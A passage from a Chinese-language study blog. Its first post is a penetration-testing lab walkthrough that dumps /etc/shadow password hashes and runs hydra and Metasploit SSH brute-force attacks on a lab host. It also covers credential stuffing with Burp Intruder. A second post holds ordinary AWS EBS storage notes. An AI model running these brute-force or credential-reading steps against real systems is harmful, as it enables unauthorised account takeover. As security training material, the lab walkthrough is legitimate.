class="line">harold:x:501:501::/home/harold:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$1$XROmcfDX<span class="variable">$tF93GqnLHOJeGRHpaNyIs0</span>:14513:0:99999:7:::</span><br><span class="line">bin:*:14513:0:99999:7:::</span><br><span class="line">daemon:*:14513:0:99999:7:::</span><br><span class="line">adm:*:14513:0:99999:7:::</span><br><span class="line">lp:*:14513:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:14513:0:99999:7:::</span><br><span class="line">shutdown:*:14513:0:99999:7:::</span><br><span class="line">halt:*:14513:0:99999:7:::</span><br><span class="line">mail:*:14513:0:99999:7:::</span><br><span class="line">news:*:14513:0:99999:7:::</span><br><span class="line">uucp:*:14513:0:99999:7:::</span><br><span class="line">operator:*:14513:0:99999:7:::</span><br><span class="line">games:*:14513:0:99999:7:::</span><br><span class="line">gopher:*:14513:0:99999:7:::</span><br><span class="line">ftp:*:14513:0:99999:7:::</span><br><span class="line">nobody:*:14513:0:99999:7:::</span><br><span class="line">mailnull:!!:14513:0:99999:7:::</span><br><span class="line">rpm:!!:14513:0:99999:7:::</span><br><span class="line">xfs:!!:14513:0:99999:7:::</span><br><span class="line">rpc:!!:14513:0:99999:7:::</span><br><span class="line">rpcuser:!!:14513:0:99999:7:::</span><br><span class="line">nfsnobody:!!:14513:0:99999:7:::</span><br><span class="line">nscd:!!:14513:0:99999:7:::</span><br><span class="line">ident:!!:14513:0:99999:7:::</span><br><span class="line">radvd:!!:14513:0:99999:7:::</span><br><span class="line">postgres:!!:14513:0:99999:7:::</span><br><span class="line">apache:!!:14513:0:99999:7:::</span><br><span class="line">squid:!!:14513:0:99999:7:::</span><br><span class="line">pcap:!!:14513:0:99999:7:::</span><br><span class="line">john:$1<span class="variable">$zL4</span>.MR4t<span class="variable">$26N4YpTGceBO0gTX6TAky1</span>:14513:0:99999:7:::</span><br><span class="line">harold:$1$Xx6dZdOd<span class="variable">$IMOGACl3r757dv17LZ9010</span>:14513:0:99999:7:::</span><br></pre></td></tr></table></figure>
<ul>
<li>通過root身分可以看到不少機敏資訊</li>
</ul>
<h3 id="Brute-Force-Attacks"><a href="#Brute-Force-Attacks" class="headerlink" title="Brute Force Attacks"></a><strong>Brute Force Attacks</strong></h3><p>從現實角度出發</p>
<ul>
<li>評估中看到SSH，嘗試對其進行暴力破解，或默認憑據<ul>
<li>測試密碼強度</li>
<li>弱密碼、默認密碼</li>
</ul>
</li>
<li><p>確認藍隊的表現</p>
<ul>
<li>評估對方是否能偵測到攻擊</li>
<li>攻擊是否有告警</li>
</ul>
</li>
<li><p>hydra - SSH 錯誤</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V**</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 16:23:58</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.19.140:22/</span><br><span class="line">[ERROR] could not connect to ssh://192.168.19.140:22 - kex error : no match <span class="keyword">for</span> method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt update&amp;&amp; apt full-upgrade -y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dpkg -l | grep kali-tweaks</span><br><span class="line">ii  kali-tweaks                                    2023.3.2                                all          tool to adjust advanced configuration settings <span class="keyword">for</span> Kali Linux</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# kali-tweaks  </span><br><span class="line">&gt;&gt;&gt; Configuring Samba</span><br><span class="line">&gt; Setting client min protocol to: LANMAN1</span><br><span class="line">&gt; Writing changes to /etc/samba/smb.conf</span><br><span class="line">&gt;&gt;&gt; Configuring SSH</span><br><span class="line">&gt; Enabling wide compatibility</span><br><span class="line">&gt; $ <span class="built_in">cp</span> -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf</span><br><span class="line"></span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃ For more information about Samba configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/samba-configuration/</span><br><span class="line">┃ For more information about SSH configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/ssh-configuration/</span><br><span class="line">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span><br><span class="line"></span><br><span class="line">&gt; Press Enter to <span class="built_in">continue</span>...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  enter &gt; 選SSH client &gt; OK</p>
<p>  <img src="img/exploit_Untitled_4.png" alt="Untitled"></p>
<p>  會需要再輸入一次</p>
<p>  <img src="img/exploit_Untitled_5.png" alt="Untitled"></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V</span><br></pre></td></tr></table></figure>
<p>同時開啟MSF，選擇需要的模塊並將選項中的參數填入，執行程式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">msf6 &gt; **search ssh**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                              ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution</span><br><span class="line">   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution</span><br><span class="line">   2   auxiliary/scanner/ssh/karaf_login                                                  normal     No     Apache Karaf Login Utility</span><br><span class="line">   3   exploit/apple_ios/ssh/cydia_default_ssh                           2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability                                                                                                    </span><br><span class="line">   4   exploit/unix/ssh/arista_tacplus_shell                             2020-02-02       great      Yes    Arista restricted shell escape (with privesc)</span><br><span class="line">   5   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution</span><br><span class="line">   6   exploit/linux/ssh/ceragon_fibeair_known_privkey                   2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure</span><br><span class="line">   7   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration</span><br><span class="line">....</span><br><span class="line">   43  exploit/linux/ssh/quantum_dxi_known_privkey                       2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure                                                                                                      </span><br><span class="line">   44  exploit/linux/ssh/quantum_vmpro_backdoor                          2014-03-17       excellent  No     Quantum vmPRO Backdoor Command</span><br><span class="line">   45  auxiliary/fuzzers/ssh/ssh_version_15                                               normal     No     SSH 1.5 Version Fuzzer</span><br><span class="line">   46  auxiliary/fuzzers/ssh/ssh_version_2                                                normal     No     SSH 2.0 Version Fuzzer</span><br><span class="line">   47  auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                          normal     No     SSH Key Exchange Init Corruption</span><br><span class="line">   48  post/linux/manage/sshkey_persistence                                               excellent  No     SSH Key Persistence</span><br><span class="line">   49  post/windows/manage/sshkey_persistence                                             good       No     SSH Key Persistence</span><br><span class="line">   **50  auxiliary/scanner/ssh/ssh_login                                                    normal     No     SSH Login Check Scanner**</span><br><span class="line">   51  auxiliary/scanner/ssh/ssh_identify_pubkeys                                         normal     No     SSH Public Key Acceptance Scanner</span><br><span class="line">   52  auxiliary/scanner/ssh/ssh_login_pubkey                                             normal     No     SSH Public Key Login Scanner</span><br><span class="line">   53  exploit/multi/ssh/sshexec                                         1999-01-01       manual     No     SSH User Code Execution</span><br><span class="line">   54  auxiliary/scanner/ssh/ssh_enumusers                                                normal     No     SSH Username Enumeration</span><br><span class="line">   55  auxiliary/fuzzers/ssh/ssh_version_corrupt                                          normal     No     SSH Version Corruption</span><br><span class="line">   56  auxiliary/scanner/ssh/ssh_version                                                  normal     No     SSH Version Scanner</span><br><span class="line">.....</span><br><span class="line">   70  payload/cmd/unix/bind_aws_instance_connect                                         normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)</span><br><span class="line">   71  exploit/linux/ssh/vmware_vrni_known_privkey                       2023-08-29       excellent  No     VMWare Aria Operations <span class="keyword">for</span> Networks (vRealize Network Insight) SSH Private Key Exposure</span><br><span class="line">   72  exploit/linux/ssh/vmware_vdp_known_privkey                        2016-12-20       excellent  No     VMware VDP Known SSH Key                                                                                                                        </span><br><span class="line">   73  exploit/multi/http/vmware_vcenter_uploadova_rce                   2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE</span><br><span class="line">   74  exploit/linux/ssh/vyos_restricted_shell_privesc                   2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation</span><br><span class="line">   75  post/windows/gather/credentials/whatsupgold_credential_dump       2022-11-22       manual     No     WhatsUp Gold Credentials Dump</span><br><span class="line">   76  post/windows/gather/credentials/mremote                                            normal     No     Windows Gather mRemote Saved Password Extraction</span><br><span class="line">   77  exploit/windows/local/unquoted_service_path                       2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation</span><br><span class="line">   78  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                       2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm</span><br><span class="line">   79  auxiliary/scanner/ssh/libssh_auth_bypass                          2018-10-16       normal     No     libssh Authentication Bypass Scanner</span><br><span class="line">   80  exploit/linux/http/php_imap_open_rce                              2018-10-23       good       Yes    php imap_open Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 80, use 80 or use exploit/linux/http/php_imap_open_rce</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 50</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>            <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none             no        Skip existing credentials stored <span class="keyword">in</span> the current database (Accepted: none, us</span><br><span class="line">                                                er, user&amp;realm)</span><br><span class="line">   PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">   RHOSTS                             <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba</span><br><span class="line">                                                sics/using-metasploit.html</span><br><span class="line">   RPORT             22               <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                      no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>            <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> username root</span><br><span class="line">username =&gt; root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">pass_file =&gt; /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.19.140</span><br><span class="line">rhosts =&gt; 192.168.19.140</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                    Required  Description</span><br><span class="line">   ----              ---------------                    --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>                              <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                              no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                                  <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                              no        Try each user/password couple stored <span class="keyword">in</span> the current databa</span><br><span class="line">                                                                  se</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                              no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                              no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none                               no        Skip existing credentials stored <span class="keyword">in</span> the current database (</span><br><span class="line">                                                                  Accepted: none, user, user&amp;realm)</span><br><span class="line">   PASSWORD                                             no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /usr/share/wordlists/metasploit/u  no        File containing passwords, one per line</span><br><span class="line">                     nix_passwords.txt</span><br><span class="line">   RHOSTS            192.168.19.140                     <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/u</span><br><span class="line">                                                                  sing-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT             22                                 <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                              <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                                  <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          root                               no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                        no        File containing <span class="built_in">users</span> and passwords separated by space, on</span><br><span class="line">                                                                  e pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                              no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                                            no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>                              <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> threads  10</span><br><span class="line">threads =&gt; 10</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> verbose <span class="literal">true</span> </span><br><span class="line">verbose =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="literal">true</span></span><br><span class="line">[*] <span class="built_in">exec</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.19.140:22 - Starting bruteforce</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:admin&#x27;</span></span><br><span class="line">[!] No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456789&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:password&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:iloveyou&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:princess&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:1234567&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345678&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:abc123&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:nicole&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:daniel&#x27;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h3 id="Credential-Stuffing-and-Password-Spraying"><a href="#Credential-Stuffing-and-Password-Spraying" class="headerlink" title="Credential Stuffing and Password Spraying"></a><strong>Credential Stuffing and Password Spraying</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/</a></li>
</ul>
<p><img src="img/exploit_Untitled_6.png" alt="Untitled"></p>
<ul>
<li>開啟這個Proxy及Burp Suite攔截目標網站的登入訊息</li>
</ul>
<p><img src="img/exploit_Untitled_7.png" alt="Untitled"></p>
<ul>
<li>burp suite intercept message send to Intruder</li>
</ul>
<p><img src="img/exploit_Untitled_8.png" alt="Untitled"></p>
<ul>
<li>修改Attack type &gt; Pitchfork</li>
</ul>
<p><img src="img/exploit_Untitled_9.png" alt="Untitled"></p>
<ul>
<li>寫入蒐集到的mail、passwd資訊</li>
</ul>
<p><img src="img/exploit_Untitled_10.png" alt="Untitled"></p>
<p><img src="img/exploit_Untitled_11.png" alt="Untitled"></p>
<ul>
<li><p>開啟攻擊並進行帳號密碼爆破</p>
<p>  <img src="img/exploit_Untitled_12.png" alt="Untitled"></p>
</li>
<li><p>可以通過回應訊息內容進行過濾</p>
</li>
<li>開啟Intruder &gt; Option &gt; Grap - Match &gt; clear &gt; Paste</li>
<li>Attack &gt; Pause<ul>
<li>check box 有打勾表示網頁有顯示Grep - Match的內容，可以透過這快速知道登入情況</li>
</ul>
</li>
</ul>
<p><img src="img/exploit_Untitled_13.png" alt="Untitled"></p>
<p><img src="img/exploit_Untitled_14.png" alt="Untitled"></p>
<p><img src="img/exploit_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>通過這個方式去尋找可能有弱密碼的可能</li>
<li>爆破需要時間，若大量發送可能會觸發防火牆告警</li>
<li>通常需要帳號/密碼表讓爆破可以嘗試的內容更多</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-EBS" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/EBS/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.081Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/EBS/">
        AWS EC2 Instance Storage
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="EBS-Volume-彈性塊存儲"><a href="#EBS-Volume-彈性塊存儲" class="headerlink" title="EBS Volume 彈性塊存儲"></a>EBS Volume 彈性塊存儲</h3><p><img src="img/EBS.png" alt="Untitled"></p>
<ul>
<li>網路驅動器</li>
<li>實例運行時將其連接到實例上</li>
<li>實例即使終止，EBS也允許我們保留數據</li>
<li>重新創建一個實例，並裝載到之前同一個EBS可以取回數據</li>
<li>在CCP Level 一次只能裝載到一個實例</li>
<li>創建EBS時，它將綁訂到特定的可用區域(AZ)<ul>
<li>假設使用us-east-1a則無法連接到us-east-1b</li>
<li>執行快照，則可以在不同的可用性區域之間移動Volume</li>
</ul>
</li>
<li>每月提供30GB免費存儲類型的通用或SSD或磁性</li>
<li>使用網路在實例跟EBS中通訊</li>
<li>可快速地從EC2實例分離並連接到另一個實例</li>
<li>需提前調配容量</li>
<li>可為配置容量付費，如果希望獲得更好的性能或更大的容量</li>
<li>長期存儲</li>
</ul>
<h3 id="EC2-Instance-Store-→-臨時存儲"><a href="#EC2-Instance-Store-→-臨時存儲" class="headerlink" title="EC2 Instance Store → 臨時存儲"></a>EC2 Instance Store → 臨時存儲</h3><p>如果需要更高性能的硬體磁碟，使用EC2 Instance Store</p>
<p>連接到真實的硬體服務器</p>
<p>使用EC2實例存儲實現更好的IO性能</p>
<p>如果希望獲得極高的磁盤性能，可以選擇這方案</p>
<p>如果停止或終止EC2實例，存儲將丟失</p>
<p>如果有緩衝區、緩存、如果希望有臨時數據、臨時內容</p>
<p>服務器發生故障，將面臨巨大損失的風險，連接到EC2實例的硬體也將發生故障</p>
<p>全部責任是確保備份，並根據需要進行複製</p>
<h3 id="終止時刪除"><a href="#終止時刪除" class="headerlink" title="終止時刪除"></a>終止時刪除</h3><p><img src="img/EBS1.png" alt="Untitled"></p>
<ul>
<li>默認情況下，Delete on Termination 對於Root Volume 處於選中狀態<ul>
<li>Root EBS Volume 將與被終止的實例一起刪除</li>
</ul>
</li>
<li>對於新的EBS Volume ，此選項未處於選中狀態<ul>
<li>任何其他連接的EBS Volume 都不會被刪除</li>
</ul>
</li>
<li>如果希望終止實例時保留Root Volume，則可以禁用Root Volume 的Delete on Termination</li>
</ul>
<h3 id="EBS-Snapshots"><a href="#EBS-Snapshots" class="headerlink" title="EBS Snapshots"></a>EBS Snapshots</h3><ul>
<li>EBS快照是EBS Volume 在任意時間點的備份</li>
<li>不必將EBS Volume 從EC2實例中分離</li>
<li>可以跨不同的可用性區域甚至跨不同的區域複製這些EBS快照</li>
</ul>
<p><img src="img/EBS2.png" alt="Untitled"></p>
<ul>
<li><p>封存快照 Archive</p>
<p>  <img src="img/EBS3.png" alt="Untitled"></p>
<ul>
<li>快照移動到封存層</li>
<li>成本最多可以降低75%</li>
<li>恢復歸檔將需要24~72小時</li>
</ul>
</li>
<li><p>回收站EBS快照 Recycle Bin</p>
<ul>
<li>如果刪除EBS Snapshots，不是永久刪除，會在Recycle Bin中</li>
<li>可以從意外刪除中恢復<ul>
<li>可以設置為一天到一年的保留時間</li>
</ul>
</li>
</ul>
</li>
<li><p>快速快照恢復 Fast Snapshot Restore (FSR)</p>
<ul>
<li>強制快照進行完全初始化，以便在第一次使用時沒有延遲</li>
<li>如果快照很大，需要初始化EBS或需要快速從其中實例化出來</li>
<li>需要花費大量資金</li>
</ul>
</li>
</ul>
<h3 id="EBS-Volume-Types"><a href="#EBS-Volume-Types" class="headerlink" title="EBS Volume Types"></a>EBS Volume Types</h3><p><img src="img/EBS4.png" alt="Untitled"></p>
<ul>
<li><p>6 types</p>
<ul>
<li>gp2/gp3 (SSD)<ul>
<li>平衡各種工作負載的價格和性能</li>
<li>為了實現經濟高效的存儲延遲</li>
<li>gp2<ul>
<li>具有低延遲的經濟高效的存儲</li>
<li>可將其用於系統引導Volume</li>
<li>1GB~16TB不等</li>
<li>有些較小的gp2 Volume 可以爆發到3000 IOPS</li>
<li>Volume 的大小和IOPS關聯</li>
<li>IOPS、吞吐量連接再一起無法單獨設置</li>
<li>如果增加IOPS、Volume GB數，將獲得3個以上的IOPS，最高到16000 IOPS ⇒ 5334 GB(最大值)</li>
</ul>
</li>
<li>gp3<ul>
<li>新一代Volume</li>
<li>可獨立設置IOPS和吞吐量</li>
<li>提供了3000 IOPS的基線和每秒125MB的吞吐量</li>
<li>可以將IOPS增加到16000</li>
<li>吞吐量增加到每秒1000MB</li>
</ul>
</li>
</ul>
</li>
<li><p>Provisioned IOPS (PIOPS SSD) Input/Output Operations Per Second</p>
<ul>
<li>用於需要維持IOPS性能的關鍵業務應用程式</li>
<li>需要大量的IOPS(可能超過16000的應用程式)</li>
<li>存儲性能和一致性非常敏感的數據工作負載</li>
<li>io1(4GiB-16GiB(最大可調配))<ul>
<li>對於Nitro EC2實例，最大PIOPS約為64000</li>
<li>對於其他類型的實例，最大PIOPS約為32000</li>
<li>可以獨立於存儲大小來增加調配的IOPS</li>
</ul>
</li>
<li>io2 Block Express(4GiB-64TiB)<ul>
<li>Sub-millisecond 等級的延遲</li>
<li>獲得大量的最大IOPS<ul>
<li>256000 with an IOPS:GiB ratio of 1000:1</li>
</ul>
</li>
<li>性能非常高的I/O類型的Volume</li>
</ul>
</li>
<li><p>支持EBS多連接功能</p>
<p>  <img src="img/EBS5.png" alt="Untitled"></p>
<ul>
<li>允許將相同的EBS Volume 連接到同一可用性區域中的多個EC2實例</li>
<li>僅適用io1、io2系列的EBS Volume</li>
<li>每個實例都將擁有對高性能Volume 的完全讀寫權限，意味著可以同時讀寫</li>
<li>在clustered Linux Application(Teradata 或你的應用程式必須管理併發寫入操作) 將獲得更高的應用程式可用性</li>
<li>僅在指定可用性區域中可用</li>
<li>不允許將EBS Volume 從一個連接到另一個<ul>
<li>多連接的另一個限制是一次<strong>最多可以連接16個EC2實例</strong></li>
</ul>
</li>
<li>要使其正常工作，必須使用一個支持集群的文件系統<ul>
<li>不同於XFS、EXT4</li>
</ul>
</li>
</ul>
</li>
<li>io1/io2 Block Express (SSD)<ul>
<li>性能最高的SSD Volume</li>
<li>用於任務關鍵型低延遲和高吞吐量工作負載</li>
</ul>
</li>
</ul>
</li>
<li>Hard Disk Drives<ul>
<li>不能是Boot Volume</li>
<li>僅適用於以前類型的Volume</li>
<li>125GiB - 16 TiB</li>
<li>st1 (HDD)<ul>
<li>經吞吐量優化的HDD</li>
<li>適合大數據、數據倉庫、日誌處理</li>
<li>最大吞吐量為每秒500MB/s</li>
<li>最大IOPS 為500</li>
<li>為頻繁訪問的吞吐量密集型工作負載而設計的低成本HDD Volume</li>
</ul>
</li>
<li>sc1 (HDD)<ul>
<li>成本最低的HDD Volume</li>
<li>設計用於訪問頻率較低的工作負載</li>
<li>用於歸檔數據<ul>
<li>不經常訪問的數據</li>
</ul>
</li>
<li>當需要盡可能低的成本時可以使用它</li>
<li>最大吞吐量為每秒250 MiB/s</li>
<li>最大IOPS為250</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>如何定義EBS Volume ?<ul>
<li>考慮 Size |Throughput IOPS (I/O Ops Per Sec)</li>
</ul>
</li>
<li>通用SSD與預配置IOPS SSD(如果需要數據庫)與st1、sc1(如果需要高吞吐量和最低成本)</li>
<li>如果想要獲得超過32000 IOPS，則需要具有io1 or io2的EC2 Nitro</li>
</ul>
<h3 id="EBS-Encryption"><a href="#EBS-Encryption" class="headerlink" title="EBS Encryption"></a>EBS Encryption</h3><ul>
<li>當創建並加密EBS Volume 時<ul>
<li>Volume 中的靜態數據被加密</li>
<li>實例和Volume 之間傳輸的所有數據都被加密</li>
<li>所有快照都將被加密</li>
<li>從快照創建的所有Volume 都將被加密</li>
</ul>
</li>
<li>所有加密和解密機制都透明的處理<ul>
<li>一切都由EC2和EBS在後台處理</li>
</ul>
</li>
<li>對延遲的影響非常小</li>
<li>利用了KMS(AES-256)的密鑰</li>
<li>Copy 未加密的快照時，就啟用了加密</li>
<li>如何加密未加密的EBS Volume<ul>
<li>創建該Volume 的EBS快照</li>
<li>複製功能加密EBS快照</li>
<li>從快照創建一個新的EBS Volume</li>
<li>該Volume 也將被加密</li>
<li>將加密的 Volume 連接到原始實例</li>
</ul>
</li>
</ul>
<h3 id="AMI-gt-Amazon-Machine-Image"><a href="#AMI-gt-Amazon-Machine-Image" class="headerlink" title="AMI &gt; Amazon Machine Image"></a>AMI &gt; Amazon Machine Image</h3><p><img src="img/EBS6.png" alt="Untitled"></p>
<ul>
